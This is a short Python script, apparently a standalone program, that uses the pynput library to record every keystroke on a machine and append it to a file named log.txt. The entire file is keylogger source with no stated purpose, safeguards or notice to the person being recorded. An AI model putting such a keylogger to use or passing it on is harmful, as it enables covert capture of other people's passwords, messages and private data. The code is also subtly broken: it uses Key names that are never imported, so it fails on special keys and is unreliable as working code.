from pynput.keyboard import Listener

def write_to_file(key):
    try:
        # If the key is a regular character
        letter = key.char
        if letter == ' ':
            letter = ' '  # Space key
        elif letter == '\n':
            letter = "\n"  # Enter key
        else:
            letter = str(letter)  # Handle all other characters
    except AttributeError:
        # Handle special keys (like shift, ctrl, etc.)
        if key == Key.space:
            letter = ' '  # Space key
        elif key == Key.enter:
            letter = '\n'  # Enter key
        elif key == Key.shift_r or key == Key.ctrl_l:
            letter = ''  # Ignore shift and ctrl keys
        else:
            letter = str(key)  # For any other non-character keys

    with open("log.txt", 'a') as f:
        f.write(letter)

# Collecting events until stopped
with Listener(on_press=write_to_file) as l:
    l.join()
